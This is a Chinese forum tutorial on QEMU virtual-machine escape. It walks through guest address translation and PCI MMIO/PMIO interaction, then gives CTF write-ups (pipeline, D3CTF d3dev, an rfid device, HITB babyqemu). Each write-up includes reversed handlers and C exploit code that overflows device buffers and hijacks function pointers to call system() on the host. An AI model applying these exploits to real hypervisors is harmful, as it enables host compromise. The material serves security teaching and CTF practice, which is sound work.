> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-275216.htm)

> qemu 逃逸系列

[](#一：基础知识介绍)一：基础知识介绍
=====================

1. 什么是 qemu 逃逸
--------------

qemu 用于模拟设备运行，而 qemu 逃逸漏洞多发于模拟 pci 设备中，漏洞形成一般是修改 qemu-system 代码，所以漏洞存在于 qemu-system 文件内。而逃逸就是指利用漏洞从 qemu-system 模拟的这个小系统逃到主机内，从而在 linux 主机内达到命令执行的目的。

2.qemu 中的地址
-----------

因为使用 qemu-system 模式启动之后相当于在 linux 内又运行了一个小型 linux，所以存在两个地址转换问题；从用户虚拟地址到用户物理地址，从用户物理地址到 qemu 虚拟地址。

 

用户的物理内存实际上是 qemu 程序 mmap 出来的，看下面的 launsh 脚本，-m 1G 也就是 mmap 一块 1G 的内存

```
#!/bin/bash
./qemu-system-x86_64 \
    -m 1G \
       -initrd ./rootfs.cpio \
    -nographic \
    -kernel ./vmlinuz-5.0.5-generic \
    -L pc-bios/ \
    -append "priority=low console=ttyS0" \
    -monitor /dev/null \
    -device pipeline

```

这块内存可以在 qemu 进程的 maps 文件下查看，sudo cat /proc/pid/maps

 

![](https://bbs.pediy.com/upload/attach/202211/922338_PZFPJM5PWHB3PCW.jpg)  
在 64 位系统内部，虚拟地址由页号和页内偏移组成，我们借用前人的代码来学习一下如何将虚拟地址转换成物理地址。

 

下面的程序申请了一个 buffer，并写入字符串——“Where am I?”，之后打印他的物理地址

```
#include #include #include #include #include #include #include #define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)
 
int fd;
// 获取页内偏移
uint32_t page_offset(uint32_t addr)
{
    // addr & 0xfff
    return addr & ((1 << PAGE_SHIFT) - 1);
}
 
uint64_t gva_to_gfn(void *addr)
{
    uint64_t pme, gfn;
    size_t offset;
 
    printf("pfn_item_offset : %p\n", (uintptr_t)addr >> 9);
    offset = ((uintptr_t)addr >> 9) & ~7;
 
    ////下面是网上其他人的代码，只是为了理解上面的代码
    //一开始除以 0x1000  （getpagesize=0x1000，4k对齐，而且本来低12位就是页内索引，需要去掉），即除以2**12, 这就获取了页号了，
    //pagemap中一个地址64位，即8字节，也即sizeof(uint64_t)，所以有了页号后，我们需要乘以8去找到对应的偏移从而获得对应的物理地址
    //最终  vir/2^12 * 8 = (vir / 2^9) & ~7
    //这跟上面的右移9正好对应，但是为什么要 & ~7 ,因为你  vir >> 12 << 3 , 跟vir >> 9 是有区别的，vir >> 12 << 3低3位肯定是0，所以通过& ~7将低3位置0
    // int page_size=getpagesize();
    // unsigned long vir_page_idx = vir/page_size;
    // unsigned long pfn_item_offset = vir_page_idx*sizeof(uint64_t);
 
    lseek(fd, offset, SEEK_SET);
    read(fd, &pme, 8);
    // 确保页面存在——page is present.
    if (!(pme & PFN_PRESENT))
        return -1;
    // physical frame number
    gfn = pme & PFN_PFN;
    return gfn;
}
 
uint64_t gva_to_gpa(void *addr)
{
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn != -1);
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}
 
int main()
{
    uint8_t *ptr;
    uint64_t ptr_mem;
 
    fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }
 
    ptr = malloc(256);
    strcpy(ptr, "Where am I?");
    printf("%s\n", ptr);
    ptr_mem = gva_to_gpa(ptr);
    printf("Your physical address is at 0x%"PRIx64"\n", ptr_mem);
 
    getchar();
    return 0;
} 
```

将其打包放到 qemu 系统内，然后进入 qemu 内部运行该 c 文件。再用 gdb attach 到 qemu 进程，查看 mmap 的内存。

 

![](https://bbs.pediy.com/upload/attach/202211/922338_5FCNTVSPGXQ236E.jpg)  
找到 qemu 的基地址之后，用字符串的物理地址与基地址相加，即可得到虚拟地址。

 

![](https://bbs.pediy.com/upload/attach/202211/922338_EW92NRK25J5Z8RN.jpg)

3.PCI 设备
--------

PCI 设备都有一个 PCI 配置空间来配置 PCI 设备，其中包含了关于 PCI 设备的特定信息。这些信息一般只需要关注 Device ID 和 Vendor ID 即可。

 

![](https://bbs.pediy.com/upload/attach/202211/922338_HYCTGR3PFJM38TQ.jpg)  
![](https://bbs.pediy.com/upload/attach/202211/922338_5GHPQ49ZTHYJUNY.jpg)  
拥有了这些信息即可在 qemu 系统内部使用 lspci 命令来找到该设备，从而能够进行交互。交互问题我们后面再细说。

4. 交互
-----

通过 kernel 提供的 sysfs，我们可以直接映射出设备对应的内存，具体方法是打开类似 `/sys/devices/pci0000:00/0000:00:04.0/resource0` 的文件，并用`mmap`将其映射到进程的地址空间，就可以对其进行读写了。这里的设备号`0000:00:04.0`是需要事先在`/proc/iomem`中看好的。当映射完成后，就可以对这块内存进行读写操作了，内存读写会触发到 qemu 内设备的 mmio 处理函数 (一般会叫`xxxx_mmio_read`/`xxxx_mmio_write`)，传入的参数是写入的地址偏移和具体的值。后面会放出一个 exp 模板。

```
int    mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
void * mmio = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);

```

也可以通过使用 / dev/mem 文件来映射物理内存。

```
void * mmio = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,open("/dev/mem",2),0xfea00000);

```

```
物理内存可由# cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource得到

```

### 1.Memory Space 类型 (MMIO)

内存和 I/O 设备共享同一个地址空间。 MMIO 是应用得最为广泛的一种 I/O 方法，它使用相同的地址总线来处理内存和 I/O 设备，I/O 设备的内存和寄存器被映射到与之相关联的地址。当 CPU 访问某个内存地址时，它可能是物理内存，也可以是某个 I/O 设备的内存，用于访问内存的 CPU 指令也可来访问 I/O 设备。每个 I/O 设备监视 CPU 的地址总线，一旦 CPU 访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳 I/O 设备，CPU 必须预留给 I/O 一个地址区域，该地址区域不能给物理内存使用。

### 2.I/O Space 类型 (PMIO)

在 PMIO 中，内存和 I/O 设备有各自的地址空间。 端口映射 I/O 通常使用一种特殊的 CPU 指令，专门执行 I/O 操作。在 Intel 的微处理器中，使用的指令是 IN 和 OUT。这些指令可以读 / 写 1,2,4 个字节（例如：outb, outw, outl）到 IO 设备上。I/O 设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在 CPU 物理接口上增加一个 I/O 引脚，要么增加一条专用的 I/O 总线。由于 I/O 地址空间与内存地址空间是隔离的，所以有时将 PMIO 称为被隔离的 IO(Isolated I/O)。在 linux 中可以通过 iopl 和 ioperm 这两个系统调用对 port 的权能进行设置。

5.qemu 中访问 PCI 设备的空间进行交互
------------------------

### 1.qemu 中访问 PCI 设备的 mmio 空间

通过 resource0 来实现，需要根据需要来修改函数参数是 uint64_t 还是 uint32_t 亦或者是 char

```
#include #include #include #include #include #include #include #include #include #include #include #include #include #include char* mmio_mem;
 
void mmio_write(uint64_t addr, char value) {
    *(char*)(mmio_mem + addr) = value;
}
 
uint64_t mmio_read(uint64_t addr) {
    return *((char *)(mmio_mem + addr));
}
int main()
{
    //init
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR | O_SYNC);
  if (fd == -1)
  {
    perror("mmio_fd open failed");
      exit(-1);
  }
    mmio_mem = mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED,fd,0);
  if (mmio_mem == MAP_FAILED)
    {
      perror("mmap mmio_mem failed");
            exit(-1);
    }
} 
```

```
#include #include #include #include #include #include #include #include #include #include #include #include #include #include char* mmio_mem;
 
void mmio_write(uint64_t addr, char value) {
    *(char*)(mmio_mem + addr) = value;
}
 
uint64_t mmio_read(uint64_t addr) {
    return *((char *)(mmio_mem + addr));
}
int main()
{
    //init
 
    mmio_mem = mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED,open("/dev/mem",2),0xfea00000); //0xfea00000是通过cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource来获得
//0x00000000fea00000 0x00000000feafffff 0x0000000000040200
 
  if (mmio_mem == MAP_FAILED)
    {
      perror("mmap mmio_mem failed");
            exit(-1);
    }
} 
```

### 2.qemu 中访问 PCI 设备的 PMIO 空间

```
#include #include #include #include #include #include #include #include #include #include #include #include #include #include char* mmio_mem;
int pmio_base = 0xc040;
void pmio_write(uint32_t addr, uint32_t value)
{
    outl(value, pmio_base + addr);
}
 
uint64_t pmio_read(uint32_t addr)
{
    return inl(pmio_base + addr);
}
int main(int argc, char *argv[])
{
 
    // Open and map I/O memory for the strng device
    if (iopl(3) !=0 ){
        perror("I/O permission is not enough");
                exit(-1);
                }
} 
```

mmap 参数 PROT_READ(1) | PROT_WRITE(2) 可读写，MAP_SHARED 共享的内存。

6. 打包 & 调试
----------

为了方便调试，我写了一个解压和压缩脚本，如下

```
#!/bin/zsh
mkdir ./rootfs
cd ./rootfs
cpio -idmv < ../rootfs.cpio
 
cp ../exp.c ./root
gcc -o ./root/exp -static ./root/exp.c
 
find . | cpio -o --format=newc > ../rootfs.cpio
 
cd ..
rm -rf ./rootfs

```

该脚本的作用是将文件系统解压在新建的 rootfs 文件夹内，再将写好的 exp.c 放到解压的文件系统的 root 目录下，将其编译成可执行文件，再重打包回 rootfs.cpio，最后删掉 rootfs 文件夹

 

进行调试时，先进行打包操作，然后运行 launch.sh 文件，再起一个终端 sudo gdb ./qemu-system-x86_64, 使用 attach 附加到 qemu-system 进程之上。可以用 ps -aux | grep qemu 来获得进程号。

 

在 gdb 内下断点，就可以愉快的调试了。下面会有介绍

 

在了解了以上的知识之后，就可以进行实操。

[](#二：实例)二：实例
=============

1.pipeline
----------

### 1. 逆向

先观察启动脚本 launch.sh，先删掉 timeout，否则超时就退出了。

```
#!/bin/bash
./qemu-system-x86_64 \
    -m 1G \
    -initrd ./rootfs.cpio \
    -nographic \
    -kernel ./vmlinuz-5.0.5-generic \
    -L pc-bios/ \
    -append "priority=low console=ttyS0" \
    -monitor /dev/null \
    -device pipeline

```

由参数 "-device pipeline" 得我们所主要逆向的部分是在 pipeline*，将 qemu-system-x86_64 放入 ida，由于存在符号，所以直接在函数栏里搜 pipeline.

 

![](https://bbs.pediy.com/upload/attach/202211/922338_KUVR463HHSMCWWS.jpg)  
漏洞一般存在于 pmio_read,pmio_write,mmio_read,mmio_write 这些对内存进行读写操作的函数内。

 

![](https://bbs.pediy.com/upload/attach/202211/922338_B3UM6B5NFW695HC.jpg)  
发现根本看不懂，都和 opaque 这个变量有关，这肯定是结构体，而结构体名字一般和函数名 pipeline 有相似，我们来转变一下，方法效果如下：

 

![](https://bbs.pediy.com/upload/attach/202211/922338_XKBF5AV263H7Z47.jpg)  
![](https://bbs.pediy.com/upload/attach/202211/922338_H46253Z6AHB2Y9M.jpg)  
![](https://bbs.pediy.com/upload/attach/202211/922338_XREMDFBSC3HG8VN.jpg)

#### 1.pipeline_mmio_read 函数

发现一个很重要的结构体贯穿四个读写函数；

 

![](https://bbs.pediy.com/upload/attach/202211/922338_XHYS9P984FG9XDX.jpg)  
逆向结果如下，总体就是从 EncPipeLine 或 DecPipeLine 内读取数据，没有越界读，最后 return 处有个 "8"，因为  
EncPipeLine 或 DecPipeLine 的 data 变量在偏移位 4 处，然后 v4 为结构体处 - 4。需要静心去逆。

 

![](https://bbs.pediy.com/upload/attach/202211/922338_2NRMXKV25BA67TM.jpg)

#### 2.pipeline_mmio_write 函数

与 pipeline_mmio_read 函数大同小异，漏洞并不在这里，功能是将 val 写入 EncPipeLine 或 DecPipeLine 内。

 

![](https://bbs.pediy.com/upload/attach/202211/922338_HAPW5CM2FJM4XVB.jpg)

#### 3.pipeline_pmio_read 函数

addr 为 0 返回 idx，为 4 返回 size。

 

![](https://bbs.pediy.com/upload/attach/202211/922338_4357FVQ36X3JMA8.jpg)

#### 4.pipeline_pmio_write 函数

猜测漏洞就在这里了，因为巨长。

 

addr 为 0 返回 idx，addr 是 4 写入 size

 

addr 为 12 时，看到了 encode，在 pipeline_instance_init 函数中发现，好像是 base64 加密的实现。并且会将加密后的数据放入 DecPipeLine 结构体内，同理

 

addr 为 16 时，就是解密，会将解密后的数据放入 EncPipeLine 结构体的 data 变量内

 

以上就是函数基本功能

 

![](https://bbs.pediy.com/upload/attach/202211/922338_FGM8TZ4DN4G2C8P.jpg)

 

![](https://bbs.pediy.com/upload/attach/202211/922338_QU3QFVPSHZJ79FD.jpg)

### 2. 调试 & 漏洞

因为 qemu 类型的题目大部分都是越界读写的问题，所以我们把注意力着重放在 size 上。我把注释写到下面的代码内。

```
void __cdecl pipeline_pmio_write(PipeLineState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  unsigned int sizea; // [rsp+4h] [rbp-4Ch]
  unsigned int sizeb; // [rsp+4h] [rbp-4Ch]
  int pIdx; // [rsp+28h] [rbp-28h]
  int pIdxa; // [rsp+28h] [rbp-28h]
  int pIdxb; // [rsp+28h] [rbp-28h]
  int useSize; // [rsp+2Ch] [rbp-24h]
  int ret_s; // [rsp+34h] [rbp-1Ch]
  int ret_sa; // [rsp+34h] [rbp-1Ch]
  char *iData; // [rsp+40h] [rbp-10h]
 
  if ( size == 4 )
  {
    if ( addr == 4 )                            // addr = 4
    {
      pIdx = opaque->pIdx;
      if ( pIdx <= 7 )
      {
        if ( pIdx > 3 )
        {
          if ( val <= 0x40 )
            *&opaque->encPipe[1].data[0x44 * pIdx + 12] = val;
        }
        else if ( val <= 0x5C )
        {
          opaque->encPipe[pIdx].size = val;
        }
      }
    }
    else if ( addr > 4 )
    {
      if ( addr == 12 )                         // addr = 12
      {
        pIdxa = opaque->pIdx;
        if ( pIdxa <= 7 )
        {
          if ( pIdxa <= 3 )
            pIdxa += 4;   //放入解密结构体内
          sizea = *&opaque->encPipe[1].data[0x44 * pIdxa + 12]; //
          if ( sizea <= 0x40 && (4 * ((sizea + 2) / 3) + 1) <= 0x5C ) //对size进行判断，不存在溢出
          {
            ret_s = opaque->encode(             // encode
                      &opaque->encPipe[1].data[0x44 * pIdxa + 16],// 加密
                      &opaque->mmio.size + 0x60 * pIdxa + 8,
                      sizea);
            if ( ret_s != -1 )
              *(&opaque->mmio.size + 24 * pIdxa + 1) = ret_s;
          }
        }
      }
      else if ( addr == 16 )
      {
        pIdxb = opaque->pIdx;
        if ( pIdxb <= 7 )
        {
          if ( pIdxb > 3 )
            pIdxb -= 4;
          sizeb = opaque->encPipe[pIdxb].size;
          iData = opaque->encPipe[pIdxb].data;
          if ( sizeb <= 0x5C )
          {
            if ( sizeb )
              iData[sizeb] = 0;
            useSize = opaque->strlen(iData);
            if ( 3 * (useSize / 4) + 1 <= 64 )  // 84，85，86，87
            {   //可以看到decode的size参数是与strlen(iData)有关，即使上面的if判断限制了useSize，也可以使useSize是84-87四个数字。
              ret_sa = opaque->decode(iData, opaque->decPipe[pIdxb].data, useSize);// 解密
              if ( ret_sa != -1 )
                opaque->decPipe[pIdxb].size = ret_sa;
            }
          }
        }
      }
    }
    else if ( !addr )
    {
      opaque->pIdx = val;
    }
  }
}

```

使用 0xff 进行 base64 编码作为测试数据，这样在解码后得到的溢出字符为 0xff，如果后续溢出 size，0xff 为最大值：

```
>>> from pwn import *
>>> b64e(b'\xff\xff\xff')
'////'

```

下面测试漏洞会不会覆盖掉 size 位

```
#include 
#include 
#include 
#include 
#include 
 
void * mmio;
int port_base = 0xc040;
 
void pmio_write(int port, int val){ outl(val, port_base + port); }
void mmio_write(uint64_t addr, char value){ *(char *)(mmio + addr) = value;}
int  pmio_read(int port) { return inl(port_base + port); }
char mmio_read(uint64_t addr){ return *(char *)(mmio + addr); }
 
void write_io(int idx,int size,int offset, char * data){
    pmio_write(0,idx); pmio_write(4,size);
    for(int i=0;i
```

看效果

 

gdb attach 之后，将断点下到 pipeline_mmio_write，就可以愉快的 c 了

 

执行 pmio_write(16,0) 之前；

 

![](https://bbs.pediy.com/upload/attach/202211/922338_48QF7F3T8KHS32E.jpg)

 

执行 pmio_write(16,0) 之后，看到 decPipe[3] 的 size 被修改为了 0xff，溢出达到，可以进行越界读写。

 

![](https://bbs.pediy.com/upload/attach/202211/922338_E4TJYRWF44QYK3Y.jpg)

### 3. 利用

既然已经完成了 size 位的劫持，再通过 mmio_read 泄露 encode 函数地址，修改 encode 指针为 system，再 pima_write(12,0) 即可命令执行

```
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
#include 
 
#include 
#include 
#include 
 
char* mmio_mem;
int pmio_base = 0xc040;
 
void mmio_write(uint64_t addr, char value) {
    *(char*)(mmio_mem + addr) = value;
}
 
uint64_t mmio_read(uint64_t addr) {
    return *((char *)(mmio_mem + addr));
}
 
void pmio_write(uint32_t addr, uint32_t value)
{
    outl(value, pmio_base + addr);
}
 
uint64_t pmio_read(uint32_t addr)
{
    return inl(pmio_base + addr);
}
 
uint64_t write_io(int idx,int size,int addr,char* data){
    pmio_write(0,idx); //get idx   rsi,rdx
    pmio_write(4,size); // set size    rsi,rdx
    for(int i=0;i
```

效果如下：

 

![](https://bbs.pediy.com/upload/attach/202211/922338_H4JQE6CUU4UMVY9.jpg)

2.2021D3CTF d3dev
-----------------

这题是 D3CTF-2021，需要使用 ubuntu20 的环境进行操作，ubuntu18 循环报错，ubuntu22 没试过。第一题叙述较为详细，后面例题我便只分析漏洞处和整体代码。

 

该题目也是有 mmio 和 pmio 两种访存方式，可以套用上面的 exp 模板，然后分析代码喽～～～

### 1. 逆向

#### 1.d3dev_mmio_read 函数

直接开幕雷击，看到了一堆什么异或之类的，问了下 re 师傅，是 tea 加密解密。一开始我是不知道这里是有越界读的，后面会分析道，那些异或是 tea decode，我们获得的数据会经过 decode，若我们想得到原始值，需要对其进行 encode。

 

![](https://bbs.pediy.com/upload/attach/202211/922338_FRCXRRU7743T7N7.jpg)

#### 2.d3dev_mmio_write 函数

和 read 函数类似，若 mmio_write_part 为 1，则对数据进行加密，若为 0，则进行写入

#### 3.d3dev_pmio_read 函数

很简单，获得 opaque 结构体的数据

 

![](https://bbs.pediy.com/upload/attach/202211/922338_WT8N7QNZ8SZV4MJ.jpg)

#### 4.d3dev_pmio_write 函数

addr 为 8 时，对 seek 进行赋值；

 

addr 为 0x1c 时，执行函数；

 

addr 为 4 时，将 key[] 清 0；

 

addr 为 0 时，设置 memory_mode.

```
void __fastcall d3dev_pmio_write(d3devState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  uint32_t *key; // rbp
 
  if ( addr == 8 )
  {
    if ( val <= 0x100 )
      opaque->seek = val;
  }
  else if ( addr > 8 )
  {
    if ( addr == 0x1C )
    {
      opaque->r_seed = val;
      key = opaque->key;
      do
        *key++ = (opaque->rand_r)(&opaque->r_seed, 0x1CLL, val, *&size);
      while ( key != &opaque->rand_r );
    }
  }
  else if ( addr )
  {
    if ( addr == 4 )
    {
      *opaque->key = 0LL;
      *&opaque->key[2] = 0LL;
    }
  }
  else
  {
    opaque->memory_mode = val;
  }
}

```

### 2. 漏洞

由 d3dev_pmio_write 函数得知可为 opaque->seek 赋值为 0x100，blocks 有 0x800 字节，d3dev_mmio_read 内的

 

data = opaque->blocks[opaque->seek + (addr >> 3)]，此处的 blocks 是通过 index 的方式进行访存，而 blocks 又是 dq 的数据 (8 bytes)，所以 seek 的 0x100 可以访问到的内存就是 0-0x800，而通过 addr 进行越界读；

 

d3dev_mmio_write 也是如此，可以越界写，我们就有了任意读写 d3devState 这个**结构体附近**的内存的 "权利".

 

在 pmio_write 里有执行 system 的机会，将 opaque->rand_r 覆盖为 system，opaque->r_seed 覆盖为 "/bin/sh"

### 3. 利用

```
#include #include #include #include #include #include unsigned char* mmio_mem;
void setup_mmio() {
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
}
 
void mmio_write(uint32_t addr,uint32_t val){
    *((uint32_t*)(addr+mmio_mem)) = val;
}
 
uint64_t mmio_read(uint64_t addr){
    return *((uint64_t*)(addr+mmio_mem));
}
 
uint32_t pmio_base = 0xc040;
void setup_pmio() {
    iopl(3);  // 0x3ff 以上端口全部开启访问
}
 
uint64_t pmio_read(uint64_t addr){
    return (uint64_t)inl(pmio_base + addr);
}
 
uint64_t pmio_write(uint64_t addr,uint64_t val){
    outl(val,addr+pmio_base);
}
 
 
//因为key=0，所以直接省略掉key进行写加密解密函数。注意exp内的en实际对应的是de
uint64_t en(uint32_t high,uint32_t low){
    uint32_t sum = 0xC6EF3720;
    uint32_t delta = 0x9E3779b9;
    for(int i=0;i<32;i++){
        high -= (low*16) ^ (low+sum) ^ (low>>5);
        low -= (high*16) ^ (high+sum) ^ (high>>5);
        //sum -= delta;
        sum += 0x61C88647;
    }
    return (uint64_t)high * 0x100000000 + low;
}
 
uint64_t de(uint32_t high,uint32_t low){
    uint32_t sum=0;
    uint32_t delta = 0x9E3779b9;
    for(int i=0;i<32;i++){
        //sum += delta;
        sum -= 0x61C88647;
        low += (high*16) ^ (high+sum) ^ (high>>5);
        high += (low*16) ^ (low+sum) ^ (low>>5);
    }
    return (uint64_t)high * 0x100000000 + low;
}
 
int main()
{
    printf("begin!!!!!\n");
    setup_mmio();
    setup_pmio();
    pmio_write(8,0x100); //opaque->seek=0x100
    pmio_write(4,0); //key[0-3]=0
    //0x103
    uint64_t rand_r = mmio_read(24); //decode
    printf("region rand_r:0x%lx\n",rand_r);
    uint64_t randr = de(rand_r/0x100000000,rand_r%0x100000000);
    printf("encode randr:0x%lx\n",randr);
    uint64_t system = randr + 0xa560;
    printf("system:0x%lx\n", system);
    uint64_t encode_system = en(system / 0x100000000, system % 0x100000000);
    printf("encode system:0x%lx\n", encode_system);
 
    uint32_t low_sys = encode_system%0x100000000;
    uint32_t high_sys = encode_system/0x100000000;
    mmio_write(24,low_sys); //只能4字节4字节的写入
    sleep(1);
    mmio_write(24,high_sys);
 
    pmio_write(8,0);
    mmio_write(0,0x67616c66); //blocks: flag
    pmio_write(0x1c,0x20746163); //r_seed: cat
 
    return 0;
} 
```

3.2019 数字经济众测 qemu
------------------

### 1. 题目分析

首先查看 launch.sh 脚本

```
#! /bin/zsh
./qemu-system-x86_64 \
-initrd ./initramfs.cpio \
-kernel ./vmlinuz-4.8.0-52-generic \
-append 'console=ttyS0 root=/dev/ram oops=panic panic=1' \
-monitor /dev/null \
-m 64M --nographic \
-L pc-bios \
-device rfid,id=vda \

```

设备是 rfid，去 ida 内函数栏搜索 rfid，并没有找到，是去掉符号表

 

这题没有符号表，所以不能在函数栏内搜索，换一个思路去搜索字符串 rfid 来寻找相应函数

 

![](https://bbs.pediy.com/upload/attach/202211/922338_7KWDMVJU23TKRBX.jpg)

 

下面的便是 rfid_class_init

 

![](https://bbs.pediy.com/upload/attach/202211/922338_5TZ5NEGEAS8YJPJ.jpg)

 

想要找到 mmio 或者 pmio 对应的 write/read 函数，需要定位到 xxxxxxx_realize 函数，例如 d3dev 这题，定位到了 pci_d3dev_realize 函数，发现 & d3dev_mmio_ops 和 & d3dev_pmio_ops，跟进去发现有实现方法。而 pci_d3dev_realize 在 d3dev_class_init 内引用

 

![](https://bbs.pediy.com/upload/attach/202211/922338_6NVKZSCSR8V6MAB.jpg)  
![](https://bbs.pediy.com/upload/attach/202211/922338_S3885VEKQEMC5M6.jpg)  
![](https://bbs.pediy.com/upload/attach/202211/922338_MPCC9G2UEB2Z7MB.jpg)

 

由以上分析可得，sub_5713A8 函数内的 sub_571043 为 realize 函数

 

![](https://bbs.pediy.com/upload/attach/202211/922338_6V9D2YCKZ49N8CP.jpg)

 

点进去 off_FE9720，发现了 mmio 的实现。

 

![](https://bbs.pediy.com/upload/attach/202211/922338_CDFYPNDE327U688.jpg)

### 2. 逆向

#### 1.sub_570C63

比对字符串，然后执行命令，漏洞肯定在另一个函数内了，看到这里应该就有了具体思路，劫持 byte_122FFE0 为 "wwssadadBABA"，复写 command 变量即可

 

![](https://bbs.pediy.com/upload/attach/202211/922338_WRDYX9B5DGJ2ZRM.jpg)

#### 2.sub_570CEB

write 函数相当于一个菜单，以 ((addr>> 20) & 0xF) 作为菜单选项，将字符传递于 byte_122FFE0，当 result 为 6 时，将 val 赋值给 command. 由于存在移位等问题，exp 的 mmio_write/mmio_read 函数的实现需要变化一下.

```
_BYTE *__fastcall sub_570CEB(__int64 opaque, unsigned __int64 addr, __int64 val, unsigned int size)
{
  _BYTE *result; // rax
  _DWORD n[3]; // [rsp+4h] [rbp-3Ch] BYREF
  unsigned __int64 v6; // [rsp+10h] [rbp-30h]
  __int64 v7; // [rsp+18h] [rbp-28h]
  int v8; // [rsp+2Ch] [rbp-14h]
  int idx; // [rsp+30h] [rbp-10h]
  int v10; // [rsp+34h] [rbp-Ch]
  __int64 v11; // [rsp+38h] [rbp-8h]
 
  v7 = opaque;
  v6 = addr;
  *&n[1] = val;
  v11 = opaque;
  v8 = (addr >> 20) & 0xF;
  idx = (addr >> 16) & 0xF;
  result = ((addr >> 20) & 0xF);
  switch ( result )
  {
    case 0uLL:
      result = byte_122FFE0;
      byte_122FFE0[idx] = 'w';
      break;
    case 1uLL:
      result = byte_122FFE0;
      byte_122FFE0[idx] = 's';
      break;
    case 2uLL:
      result = byte_122FFE0;
      byte_122FFE0[idx] = 'a';
      break;
    case 3uLL:
      result = byte_122FFE0;
      byte_122FFE0[idx] = 'd';
      break;
    case 4uLL:
      result = byte_122FFE0;
      byte_122FFE0[idx] = 'A';
      break;
    case 5uLL:
      result = byte_122FFE0;
      byte_122FFE0[idx] = 'B';
      break;
    case 6uLL:
      v10 = v6;
      result = memcpy(&command[v6], &n[1], size);
      break;
    default:
      return result;
  }
  return result;
}

```

### 3. 调试

本题没有符号表，为调试增加了比较大的困难，但是由于题目比较简单，不调试也可以做出来，为了进行学习，我来尝试一下调试。应该就和普通的 pwn 题一样调试，用 b *$rebase(addr) 下断点

 

测试环境 ubuntu20 可以，ubnutu18 不行

 

![](https://bbs.pediy.com/upload/attach/202211/922338_4T4XKVZY6TUM5C3.jpg)

 

下好了断点，c 执行，然后运行 exp，便可以愉快的观察程序运行

 

![](https://bbs.pediy.com/upload/attach/202211/922338_3MTXMHDFV9SX7KZ.jpg)  
![](https://bbs.pediy.com/upload/attach/202211/922338_MZTWSCNPN58H6E4.jpg)

### 4. 利用

```
#include #include #include #include #include #include #include #include #include #include unsigned char* mmiobase;
//wwssadadBABA
void mmio_write(uint64_t addr,uint64_t val){
      *(uint64_t *)(mmiobase + addr) = val;
}
 
int main(){
 mmiobase = mmap(0,0x1000000,PROT_READ | PROT_WRITE, MAP_SHARED, open("/dev/mem",2),0xfb000000);
                                                   //str    idx
  mmio_write(0x000000,0);  //w   ,   0
  mmio_write(0x010000,0);     //w   ,   1
    mmio_write(0x120000,0);  //s   ,   2
  mmio_write(0x130000,0);  //s   ,   3
  mmio_write(0x240000,0);  //a   ,   4
  mmio_write(0x350000,0);  //d   ,   5
  mmio_write(0x260000,0);  //a   ,   6
  mmio_write(0x370000,0);  //d   ,   7
  mmio_write(0x580000,0);  //B   ,   8
  mmio_write(0x490000,0);  //A   ,   9
  mmio_write(0x5a0000,0);  //B   ,   a
  mmio_write(0x4b0000,0);  //A   ,   b
 
 
  char cmd[0x20] = "cat flag";
  mmio_write(0x600000,*(uint64_t *)(&cmd[0]));
  return *(int *)mmiobase;
} 
```

效果如图:

 

![](https://bbs.pediy.com/upload/attach/202211/922338_ZGEU3S59GV8QHPY.jpg)

4.2017HITB babyqemu
-------------------

### 1. 题目分析

直接扔 ida，有符号✌️，搜索一下只发现了 mmio_read/mmio_write，然后恢复一下结构体；

 

![](https://bbs.pediy.com/upload/attach/202211/922338_3SHDWM5UKD855H5.jpg)

 

查看一下主要操作的结构体

 

![](https://bbs.pediy.com/upload/attach/202211/922338_VPSRYD9CUB2DV46.jpg)

### 2. 逆向

#### 1.hitb_mmio_read 函数

返回各个结构体内的数据，不存在漏洞

```
uint64_t __fastcall hitb_mmio_read(HitbState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax
  uint64_t val; // [rsp+0h] [rbp-20h]
 
  result = -1LL;
  if ( size == 4 )
  {
    if ( addr == 128 )
      return opaque->dma.src;
    if ( addr > 128 )
    {
      if ( addr == 140 )
        return *(&opaque->dma.dst + 4);
      if ( addr <= 140 )
      {
        if ( addr == 132 )
          return *(&opaque->dma.src + 4);
        if ( addr == 136 )
          return opaque->dma.dst;
      }
      else
      {
        if ( addr == 144 )
          return opaque->dma.cnt;
        if ( addr == 152 )
          return opaque->dma.cmd;
      }
    }
    else
    {
      if ( addr == 8 )
      {
        qemu_mutex_lock(&opaque->thr_mutex);
        val = opaque->fact;
        qemu_mutex_unlock(&opaque->thr_mutex);
        return val;
      }
      if ( addr <= 8 )
      {
        result = 0x10000EDLL;
        if ( !addr )
          return result;
        if ( addr == 4 )
          return opaque->addr4;
      }
      else
      {
        if ( addr == 0x20 )
          return opaque->status;
        if ( addr == 0x24 )
          return opaque->irq_status;
      }
    }
    return -1LL;
  }
  return result;
}

```

#### 2.hitb_mmio_write 函数

正常对 HitbState 字段写入，但是有一个函数调用很可疑 timer_mod(&opaque->dma_timer, ns / 1000000 + 100);

```
void __fastcall hitb_mmio_write(HitbState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  uint32_t v4; // r13d
  int v5; // edx
  bool v6; // zf
  int64_t ns; // rax
 
